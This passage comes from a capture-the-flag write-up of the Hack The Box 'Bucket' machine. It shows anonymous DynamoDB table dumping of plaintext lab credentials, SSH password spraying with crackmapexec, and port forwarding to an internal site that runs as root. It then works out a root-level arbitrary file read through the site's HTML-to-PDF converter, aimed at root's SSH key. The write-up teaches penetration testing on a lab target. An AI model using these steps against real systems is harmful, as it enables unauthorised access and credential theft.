drwxr-xr-x  <span style="color:#ae81ff">3</span> roy roy  <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2020</span> .
drwxr-xr-x  <span style="color:#ae81ff">5</span> roy roy  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">24</span> 17:31 ..
-rw-rw-r--  <span style="color:#ae81ff">1</span> roy roy    <span style="color:#ae81ff">63</span> Sep <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2020</span> composer.json
-rw-rw-r--  <span style="color:#ae81ff">1</span> roy roy <span style="color:#ae81ff">20533</span> Sep <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2020</span> composer.lock
-rw-r--r--  <span style="color:#ae81ff">1</span> roy roy   <span style="color:#ae81ff">367</span> Sep <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2020</span> db.php
drwxrwxr-x <span style="color:#ae81ff">10</span> roy roy  <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2020</span> vendor
</code></pre></div><p>Looking into <code>db.php</code>, the project seems to use AWS DynamoDB as the project database. I can also see the endpoint url.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bucket:/home/roy/project$ cat db.php

&lt;?php
require <span style="color:#e6db74">&#39;vendor/autoload.php&#39;</span>;
date_default_timezone_set<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;America/New_York&#39;</span><span style="color:#f92672">)</span>;
use Aws<span style="color:#ae81ff">\D</span>ynamoDb<span style="color:#ae81ff">\D</span>ynamoDbClient;
use Aws<span style="color:#ae81ff">\D</span>ynamoDb<span style="color:#ae81ff">\E</span>xception<span style="color:#ae81ff">\D</span>ynamoDbException;

$client <span style="color:#f92672">=</span> new Aws<span style="color:#ae81ff">\S</span>dk<span style="color:#f92672">([</span>
    <span style="color:#e6db74">&#39;profile&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;default&#39;</span>,
    <span style="color:#e6db74">&#39;region&#39;</span>  <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;us-east-1&#39;</span>,
    <span style="color:#e6db74">&#39;version&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;latest&#39;</span>,
    <span style="color:#e6db74">&#39;endpoint&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;http://localhost:4566&#39;</span>
<span style="color:#f92672">])</span>;

$dynamodb <span style="color:#f92672">=</span> $client-&gt;createDynamoDb<span style="color:#f92672">()</span>;

//todo
</code></pre></div><p><code>localhost:4566</code> is the internal endpoint of <code>s3.bucket.htb</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bucket:/home/roy/project$ curl -s http://localhost:4566

<span style="color:#f92672">{</span>
	<span style="color:#e6db74">&#34;s3&#34;</span>: <span style="color:#e6db74">&#34;running&#34;</span>, 
	<span style="color:#e6db74">&#34;dynamodb&#34;</span>: <span style="color:#e6db74">&#34;running&#34;</span>
<span style="color:#f92672">}</span>
</code></pre></div><h4 id="aws-dynamodb">AWS DynamoDB</h4>
<p>DynamoDB is a NoSQL database developed by Amazon. I can also use the amazon cli to interact with the DynamoDB, and it uses the same endpoint as the S3.</p>
<p>General usage:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">usage: aws <span style="color:#f92672">[</span>options<span style="color:#f92672">]</span> dynamodb &lt;subcommand&gt; <span style="color:#f92672">[</span>&lt;subcommand&gt; ...<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>parameters<span style="color:#f92672">]</span>
</code></pre></div><p>Anonymous user is allowed to list the database tables.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb
<span style="color:#f92672">{</span>
    <span style="color:#e6db74">&#34;TableNames&#34;</span>: <span style="color:#f92672">[</span>
        <span style="color:#e6db74">&#34;users&#34;</span>
    <span style="color:#f92672">]</span>
<span style="color:#f92672">}</span>
</code></pre></div><p>I can read the content of table <code>users</code> with the subcommand <code>scan</code>, and it discovers several credentials.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb
<span style="color:#f92672">{</span>
    <span style="color:#e6db74">&#34;Items&#34;</span>: <span style="color:#f92672">[</span>
        <span style="color:#f92672">{</span>
            <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#f92672">{</span>
                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Management@#1@#&#34;</span>
            <span style="color:#f92672">}</span>,
            <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#f92672">{</span>
                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Mgmt&#34;</span>
            <span style="color:#f92672">}</span>
        <span style="color:#f92672">}</span>,
        <span style="color:#f92672">{</span>
            <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#f92672">{</span>
                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Welcome123!&#34;</span>
            <span style="color:#f92672">}</span>,
            <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#f92672">{</span>
                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Cloudadm&#34;</span>
            <span style="color:#f92672">}</span>
        <span style="color:#f92672">}</span>,
        <span style="color:#f92672">{</span>
            <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#f92672">{</span>
                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;n2vM-&lt;_K_Q:.Aa2&#34;</span>
            <span style="color:#f92672">}</span>,
            <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#f92672">{</span>
                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Sysadm&#34;</span>
            <span style="color:#f92672">}</span>
        <span style="color:#f92672">}</span>
    <span style="color:#f92672">]</span>,
    <span style="color:#e6db74">&#34;Count&#34;</span>: 3,
    <span style="color:#e6db74">&#34;ScannedCount&#34;</span>: 3,
    <span style="color:#e6db74">&#34;ConsumedCapacity&#34;</span>: null
<span style="color:#f92672">}</span>
</code></pre></div><p>I&rsquo;ll keep those credentials.</p>
<h4 id="ssh-access">SSH Access</h4>
<p>Password <code>n2vM-&lt;_K_Q:.Aa2</code> works on <code>roy</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ crackmapexec ssh <span style="color:#e6db74">&#39;10.10.10.212&#39;</span> -u roy -p passwords.list
SSH         10.10.10.212    <span style="color:#ae81ff">22</span>     10.10.10.212     <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
SSH         10.10.10.212    <span style="color:#ae81ff">22</span>     10.10.10.212     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> roy:Management@#1@# Authentication failed.
SSH         10.10.10.212    <span style="color:#ae81ff">22</span>     10.10.10.212     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> roy:Welcome123! Authentication failed.
SSH         10.10.10.212    <span style="color:#ae81ff">22</span>     10.10.10.212     <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> roy:n2vM-&lt;_K_Q:.Aa2 
</code></pre></div><p>Now I can login into the system using <code>roy</code> credentials.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@iamf «bucket» «10.10.14.39» 
$ ssh roy@10.10.10.212
roy@10.10.10.212&#39;s password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)

...&lt;SNIP&gt;...
  System load:                      0.02
  Usage of /:                       33.8% of 17.59GB
  Memory usage:                     29%
  Swap usage:                       0%
  Processes:                        252
  Users logged in:                  0
  IPv4 address for br-bee97070fb20: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.10.10.212
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:df48

...&lt;SNIP&gt;...
roy@bucket:~$ id
uid=1000(roy) gid=1000(roy) groups=1000(roy),1001(sysadm)
roy@bucket:~$ 
</code></pre></div><p>The user flag is done here.</p>
<p><div class="img-container"><img src="imgs/image-20210423013951765.png" alt="image-20210423013951765"  /></div>
</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>Running WinPEAS discovers another service currently running on port 8000.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                                                                                 
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                     
tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:46275         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      - 
</code></pre></div><p>It also discovers that <code>bucket-app</code> in <code>/var/www/</code> is belong to the root user and readable to user <code>roy</code> but not to others.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">[+] Readable files belonging to root and readable by me but not world readable
-rwxr-x---+ 1 root root 808729 Jun 10  2020 /var/www/bucket-app/pd4ml_demo.jar                                 
-rw-r-x---+ 1 root root 358 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/README.md
-rw-r-x---+ 1 root root 1085 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/LICENSE
-rw-r-x---+ 1 root root 4689 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/src/UploadedFileInterface.php
-rw-r-x---+ 1 root root 4746 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/src/StreamInterface.php
</code></pre></div><p>I can list the contents inside <code>bucket-app</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">roy@bucket:/var/www/bucket-app$ ls -la
total <span style="color:#ae81ff">856</span>
drwxr-x---+  <span style="color:#ae81ff">4</span> root root   <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">10</span> 12:29 .
drwxr-xr-x   <span style="color:#ae81ff">4</span> root root   <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">10</span> 12:29 ..
-rw-r-x---+  <span style="color:#ae81ff">1</span> root root     <span style="color:#ae81ff">63</span> Sep <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2020</span> composer.json
-rw-r-x---+  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">20533</span> Sep <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2020</span> composer.lock
drwxr-x---+  <span style="color:#ae81ff">2</span> root root   <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 12:38 files
-rwxr-x---+  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">17222</span> Sep <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2020</span> index.php
-rwxr-x---+  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">808729</span> Jun <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2020</span> pd4ml_demo.jar
drwxr-x---+ <span style="color:#ae81ff">10</span> root root   <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">10</span> 12:29 vendor
</code></pre></div><p>According to the Apache config file, the service on port 8000 is an internal website, and it is assigned to the root user. In other words, it is running as root.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">roy@bucket:~$ cat /etc/apache2/sites-available/000-default.conf 

<span style="color:#f92672">&lt;VirtualHost</span> <span style="color:#960050;background-color:#1e0010">127.0.0.1:8000</span><span style="color:#f92672">&gt;</span> # unknown
        <span style="color:#f92672">&lt;IfModule</span> <span style="color:#960050;background-color:#1e0010">mpm_itk_module</span><span style="color:#f92672">&gt;</span>
                AssignUserId root root
        <span style="color:#f92672">&lt;/IfModule&gt;</span>
        DocumentRoot /var/www/bucket-app
<span style="color:#f92672">&lt;/VirtualHost&gt;</span>

<span style="color:#f92672">&lt;VirtualHost</span> <span style="color:#960050;background-color:#1e0010">*:80</span><span style="color:#f92672">&gt;</span> # bucket.htb
        DocumentRoot /var/www/html
        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^bucket.htb$
        RewriteRule /.* http://bucket.htb/ [R]
<span style="color:#f92672">&lt;/VirtualHost&gt;</span>
<span style="color:#f92672">&lt;VirtualHost</span> <span style="color:#960050;background-color:#1e0010">*:80</span><span style="color:#f92672">&gt;</span> # s3.bucket.htb 

        ProxyPreserveHost on
        ProxyPass / http://localhost:4566/
        ProxyPassReverse / http://localhost:4566/
        <span style="color:#f92672">&lt;Proxy</span> <span style="color:#960050;background-color:#1e0010">*</span><span style="color:#f92672">&gt;</span>
                 Order deny,allow
                 Allow from all
         <span style="color:#f92672">&lt;/Proxy&gt;</span>
        ServerAdmin webmaster@localhost
        ServerName s3.bucket.htb

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

<span style="color:#f92672">&lt;/VirtualHost&gt;</span>
</code></pre></div><h4 id="internal-web">Internal Web</h4>
<p>I&rsquo;ll expose the internal web to my localhost on the same port using SSH local port forwarding.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">roy@bucket:/var/www/bucket-app$ ~C
ssh&gt; -L 8000:127.0.0.1:8000
Forwarding port.
roy@bucket:/var/www/bucket-app$
</code></pre></div><p>The website page says the site is under construction.</p>
<p><div class="img-container"><img src="imgs/image-20210423015905604.png" alt="image-20210423015905604"  /></div>
</p>
<h4 id="source-code-review">Source Code Review</h4>
<p>Upon reviewing the <code>index.php</code>, I found out that this website can be abused.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">roy@bucket:/var/www/bucket-app$ cat index.php 

&lt;?php
require <span style="color:#e6db74">&#39;vendor/autoload.php&#39;</span>;
use Aws<span style="color:#ae81ff">\D</span>ynamoDb<span style="color:#ae81ff">\D</span>ynamoDbClient;
<span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>$_SERVER<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;REQUEST_METHOD&#34;</span><span style="color:#f92672">]===</span><span style="color:#e6db74">&#34;POST&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
        <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>$_POST<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;action&#34;</span><span style="color:#f92672">]===</span><span style="color:#e6db74">&#34;get_alerts&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span> <span style="color:#75715e"># POST action=get_alerts </span>
                date_default_timezone_set<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;America/New_York&#39;</span><span style="color:#f92672">)</span>;
                $client <span style="color:#f92672">=</span> new DynamoDbClient<span style="color:#f92672">([</span>  <span style="color:#75715e"># Connect to DynamoDB.</span>
                        <span style="color:#e6db74">&#39;profile&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;default&#39;</span>,
                        <span style="color:#e6db74">&#39;region&#39;</span>  <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;us-east-1&#39;</span>,
                        <span style="color:#e6db74">&#39;version&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;latest&#39;</span>,
                        <span style="color:#e6db74">&#39;endpoint&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;http://localhost:4566&#39;</span>
                <span style="color:#f92672">])</span>;
                
                $iterator <span style="color:#f92672">=</span> $client-&gt;getIterator<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Scan&#39;</span>, array<span style="color:#f92672">(</span> <span style="color:#75715e"># Read content from table alerts</span>
                        <span style="color:#e6db74">&#39;TableName&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;alerts&#39;</span>,
                        <span style="color:#e6db74">&#39;FilterExpression&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#34;title = :title&#34;</span>, <span style="color:#75715e"># Filter by title</span>
                        <span style="color:#e6db74">&#39;ExpressionAttributeValues&#39;</span> <span style="color:#f92672">=</span>&gt; array<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;:title&#34;</span><span style="color:#f92672">=</span>&gt;array<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;S&#34;</span><span style="color:#f92672">=</span>&gt;<span style="color:#e6db74">&#34;Ransomware&#34;</span><span style="color:#f92672">))</span>,
                <span style="color:#f92672">))</span>;

                foreach <span style="color:#f92672">(</span>$iterator as $item<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>  <span style="color:#75715e"># </span>
                        $name<span style="color:#f92672">=</span>rand<span style="color:#f92672">(</span>1,10000<span style="color:#f92672">)</span>.<span style="color:#e6db74">&#39;.html&#39;</span>; <span style="color:#75715e"># Generate randomnumber.html </span>
                        file_put_contents<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;files/&#39;</span>.$name,$item<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;data&#34;</span><span style="color:#f92672">])</span>; <span style="color:#75715e"># Write contents to randomnumber.html</span>
                <span style="color:#f92672">}</span>
                passthru<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/</span>$name<span style="color:#e6db74"> 800 A4 -out files/result.pdf&#34;</span><span style="color:#f92672">)</span>; <span style="color:#75715e"># convert randomnumber.html to result.pdf</span>
        <span style="color:#f92672">}</span>
<span style="color:#f92672">}</span>
<span style="color:#66d9ef">else</span>
<span style="color:#f92672">{</span>
?&gt;
...&lt;SNIP&gt;...
</code></pre></div><p>Let&rsquo;s break it down.</p>
<p>When there is a POST request contains data of <code>action=get_alerts</code>, the site will create a connection to DynamoDB.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span>($_SERVER[<span style="color:#e6db74">&#34;REQUEST_METHOD&#34;</span>]<span style="color:#f92672">===</span><span style="color:#e6db74">&#34;POST&#34;</span>) {
        <span style="color:#66d9ef">if</span>($_POST[<span style="color:#e6db74">&#34;action&#34;</span>]<span style="color:#f92672">===</span><span style="color:#e6db74">&#34;get_alerts&#34;</span>) { <span style="color:#75715e"># POST action=get_alerts 
</span><span style="color:#75715e"></span>                <span style="color:#a6e22e">date_default_timezone_set</span>(<span style="color:#e6db74">&#39;America/New_York&#39;</span>);
                $client <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DynamoDbClient</span>([  <span style="color:#75715e"># Connect to DynamoDB.
</span><span style="color:#75715e"></span>                        <span style="color:#e6db74">&#39;profile&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;default&#39;</span>,
                        <span style="color:#e6db74">&#39;region&#39;</span>  <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;us-east-1&#39;</span>,
                        <span style="color:#e6db74">&#39;version&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;latest&#39;</span>,
                        <span style="color:#e6db74">&#39;endpoint&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;http://localhost:4566&#39;</span>
                ]);
</code></pre></div><p>It then reads every item in table <code>alerts</code> and filters out the result only to the one that contains string value of “Ransomware” (the key).</p>
<blockquote>
<p>DynamoDB is key-value NoSQL database.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$iterator <span style="color:#f92672">=</span> $client<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getIterator</span>(<span style="color:#e6db74">&#39;Scan&#39;</span>, <span style="color:#66d9ef">array</span>( <span style="color:#75715e"># Read content from table alerts
</span><span style="color:#75715e"></span>       <span style="color:#e6db74">&#39;TableName&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;alerts&#39;</span>,
       <span style="color:#e6db74">&#39;FilterExpression&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;title = :title&#34;</span>, <span style="color:#75715e"># Filter by title
</span><span style="color:#75715e"></span>       <span style="color:#e6db74">&#39;ExpressionAttributeValues&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;:title&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;S&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;Ransomware&#34;</span>)),
));
</code></pre></div><p>For each result, it writes the result value ($item[“data”]) of &ldquo;Ransomware&rdquo; to a randomly named HTML file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">foreach</span> ($iterator <span style="color:#66d9ef">as</span> $item) {  <span style="color:#75715e"># 
</span><span style="color:#75715e"></span>        $name<span style="color:#f92672">=</span><span style="color:#a6e22e">rand</span>(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">10000</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;.html&#39;</span>; <span style="color:#75715e"># Generate randomnumber.html 
</span><span style="color:#75715e"></span>        <span style="color:#a6e22e">file_put_contents</span>(<span style="color:#e6db74">&#39;files/&#39;</span><span style="color:#f92672">.</span>$name,$item[<span style="color:#e6db74">&#34;data&#34;</span>]); <span style="color:#75715e"># Write contents to randomnumber.html
</span><span style="color:#75715e"></span>}
</code></pre></div><p>The HTML file then gets converted into a PDF file (<code>result.pdf</code>) using <code>pd4ml</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">passthru</span>(<span style="color:#e6db74">&#34;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/</span><span style="color:#e6db74">$name</span><span style="color:#e6db74"> 800 A4 -out files/result.pdf&#34;</span>); <span style="color:#75715e"># convert randomnumber.html to result.pdf
</span></code></pre></div><p>From the enumeration above on the DynamoDB, I know there is no table called <code>alerts</code>.</p>
<p>The idea is, if I have a control over the <code>alerts</code> table as well as the write and read operations on the table, then I can abuse this web application to read almost any file on the system* (arbitrary file read)</p>
<blockquote>
<p>*The web application is currently running as root</p>
</blockquote>
<h4 id="obtain-root-ssh-key">Obtain root SSH Key</h4>
<p>First I’ll try to create a dummy table on the database. I’ll use JSON file to create it.</p>
<p><code>test-table.json</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
	<span style="color:#f92672">&#34;TableName&#34;</span>: <span style="color:#e6db74">&#34;iamf&#34;</span>,
	<span style="color:#f92672">&#34;AttributeDefinitions&#34;</span>: 
	[
		{ <span style="color:#f92672">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;Name&#34;</span>, <span style="color:#f92672">&#34;AttributeType&#34;</span> : <span style="color:#e6db74">&#34;S&#34;</span> }
	],
	<span style="color:#f92672">&#34;KeySchema&#34;</span>: 
	[ 
		{ <span style="color:#f92672">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;Name&#34;</span>, <span style="color:#f92672">&#34;KeyType&#34;</span> : <span style="color:#e6db74">&#34;HASH&#34;</span> }
	],
	<span style="color:#f92672">&#34;ProvisionedThroughput&#34;</span> : 
		{ <span style="color:#f92672">&#34;WriteCapacityUnits&#34;</span>: <span style="color:#ae81ff">5</span>, <span style="color:#f92672">&#34;ReadCapacityUnits&#34;</span>: <span style="color:#ae81ff">10</span> }
}
</code></pre></div><p>Now I can use the subcommand <code>create-table</code> with <code>--cli-input-json</code> option and specify the JSON file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ aws dynamodb create-table --cli-input-json file://test-table.json --endpoint-url  http://s3.bucket.htb

<span style="color:#f92672">{</span>
    <span style="color:#e6db74">&#34;TableDescription&#34;</span>: <span style="color:#f92672">{</span>
        <span style="color:#e6db74">&#34;AttributeDefinitions&#34;</span>: <span style="color:#f92672">[</span>
            <span style="color:#f92672">{</span>
                <span style="color:#e6db74">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;Name&#34;</span>,
                <span style="color:#e6db74">&#34;AttributeType&#34;</span>: <span style="color:#e6db74">&#34;S&#34;</span>
            <span style="color:#f92672">}</span>
        <span style="color:#f92672">]</span>,
        <span style="color:#e6db74">&#34;TableName&#34;</span>: <span style="color:#e6db74">&#34;iamf&#34;</span>,
        <span style="color:#e6db74">&#34;KeySchema&#34;</span>: <span style="color:#f92672">[</span>
            <span style="color:#f92672">{</span>
                <span style="color:#e6db74">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;Name&#34;</span>,
                <span style="color:#e6db74">&#34;KeyType&#34;</span>: <span style="color:#e6db74">&#34;HASH&#34;</span>
            <span style="color:#f92672">}</span>
        <span style="color:#f92672">]</span>,
        <span style="color:#e6db74">&#34;TableStatus&#34;</span>: <span style="color:#e6db74">&#34;ACTIVE&#34;</span>,
        <span style="color:#e6db74">&#34;CreationDateTime&#34;</span>: <span style="color:#e6db74">&#34;2021-04-22T15:22:33.634000-04:00&#34;</span>,
...&lt;SNIP&gt;...
</code></pre></div><p>I can confirm the table has been created using the subcommand <code>list-tables</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb

<span style="color:#f92672">{</span>
    <span style="color:#e6db74">&#34;TableNames&#34;</span>: <span style="color:#f92672">[</span>
        <span style="color:#e6db74">&#34;iamf&#34;</span>,
        <span style="color:#e6db74">&#34;users&#34;</span>
    <span style="color:#f92672">]</span>
<span style="color:#f92672">}</span>
</code></pre></div><blockquote>
<p>I can also insert items to the table, but I&rsquo;ll skip it here. Detailed notes are available on my GitHub.</p>
</blockquote>
<p>Knowing this, now I can create the <code>alerts</code> table. I’ll write it on JSON format as well.</p>
<p><code>alert-table.json</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
        <span style="color:#f92672">&#34;TableName&#34;</span>: <span style="color:#e6db74">&#34;alerts&#34;</span>,
        <span style="color:#f92672">&#34;AttributeDefinitions&#34;</span>:
        [
                {<span style="color:#f92672">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;title&#34;</span>, <span style="color:#f92672">&#34;AttributeType&#34;</span> : <span style="color:#e6db74">&#34;S&#34;</span>},
                {<span style="color:#f92672">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;data&#34;</span>, <span style="color:#f92672">&#34;AttributeType&#34;</span> : <span style="color:#e6db74">&#34;S&#34;</span>}
        ],
        <span style="color:#f92672">&#34;KeySchema&#34;</span>:
        [
                {<span style="color:#f92672">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;title&#34;</span>, <span style="color:#f92672">&#34;KeyType&#34;</span> : <span style="color:#e6db74">&#34;HASH&#34;</span>},
                {<span style="color:#f92672">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;data&#34;</span>, <span style="color:#f92672">&#34;KeyType&#34;</span> : <span style="color:#e6db74">&#34;RANGE&#34;</span>}
        ],
        <span style="color:#f92672">&#34;ProvisionedThroughput&#34;</span> :
